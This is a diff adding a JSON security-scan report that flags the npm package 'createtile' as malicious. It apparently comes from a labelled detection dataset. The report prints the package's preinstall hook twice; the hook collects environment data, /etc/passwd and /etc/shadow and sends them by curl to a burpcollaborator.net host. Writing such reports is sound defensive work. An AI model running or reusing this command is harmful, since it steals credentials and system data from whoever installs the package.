@@ -1,0 +1,75 @@
+{
+  "package_name": "createtile",
+  "version": "99.0.0",
+  "scan_timestamp": "2026-03-27T14:50:08.715251",
+  "final_verdict": {
+    "classification": "MALICIOUS",
+    "confidence": 0.8,
+    "risk_level": "HIGH"
+  },
+  "executive_summary": "The package 'createtile' is making network calls to a known exfiltration collector domain (linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net) during the pre-install command. This could potentially indicate a supply chain attack. The detected behaviors have no legitimate justification based on the package's stated purpose.",
+  "threat_profile": {
+    "attack_type": "Data Exfiltration",
+    "primary_tactics": [
+      "Exfiltration (File/Data)",
+      "Persistence (Install Hook)"
+    ],
+    "severity_factors": [
+      "The package.json scripts.preinstall command is making network calls to a known exfiltration collector domain.",
+      "The package.json scripts.preinstall command is a known install hook."
+    ],
+    "attack_vector_iocs": [
+      "postinstallhook",
+      "bash-c",
+      "34.x.x.x:4444",
+      "reverseshell"
+    ]
+  },
+  "evidence_summary": {
+    "malicious_indicators": [
+      {
+        "type": "Data Exfiltration",
+        "description": "The package.json scripts.preinstall command is making network calls to a known exfiltration collector domain. The domain is 'linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net'. This could potentially indicate data exfiltration.",
+        "severity": "HIGH",
+        "command": "export HOSTNAME&&BCNET=\"linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\";sleep.5;ping-c1$BCNET;foriinenv\"psaux\"cat/proc/version/proc/net/fib_trie/proc/net/if_inet6\"cat/etc/hosts/etc/passwd/etc/shadow\";docurlhttps://$BCNET-ski-m30-d\"$($i2>&1|base64-w0)\";done||ping-n1windows-createtile-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net||true"
+      },
+      {
+        "type": "Install Hook",
+        "description": "The package.json scripts.preinstall command is a known install hook. This could potentially indicate a supply chain attack.",
+        "severity": "HIGH",
+        "command": "export HOSTNAME&&BCNET=\"linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\";sleep.5;ping-c1$BCNET;foriinenv\"psaux\"cat/proc/version/proc/net/fib_trie/proc/net/if_inet6\"cat/etc/hosts/etc/passwd/etc/shadow\";docurlhttps://$BCNET-ski-m30-d\"$($i2>&1|base64-w0)\";done||ping-n1windows-createtile-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net||true"
+      }
+    ],
+    "behavioral_chain": "The package 'createtile' is making network calls to a known exfiltration collector domain (linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net) during the pre-install command. This could potentially indicate a supply chain attack.",
+    "legitimacy_assessment": "The package has no description/README and the behavior is clearly anomalous."
+  },
+  "recommendations": {
+    "immediate_action": "DO NOT INSTALL — Remove immediately if already installed",
+    "remediation_steps": [
+      "Review package source code and dependencies",
+      "Inspect install/preinstall scripts in package.json",
+      "Report to npm security team if confirmed malicious"
+    ]
+  },
+  "detailed_analysis": {
+    "semantic_detection": {
+      "behaviors_found": 2,
+      "categories": [
+        "data_exfiltration",
+        "install_hook"
+      ],
+      "highest_confidence": 0.83
+    },
+    "verification_analysis": {
+      "chain_narrative": "The package 'createtile' is making network calls to a known exfiltration collector domain (linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net) during the pre-install command. This could potentially indicate a supply chain attack.",
+      "chain_score": 0.78,
+      "legitimacy_mismatch": true,
+      "verification_available": true
+    }
+  },
+  "metadata": {
+    "analysis_version": "semantic_v2.0",
+    "model": "deepseek-coder-6.7b-instruct",
+    "ground_truth_label": "malicious"
+  }
+}
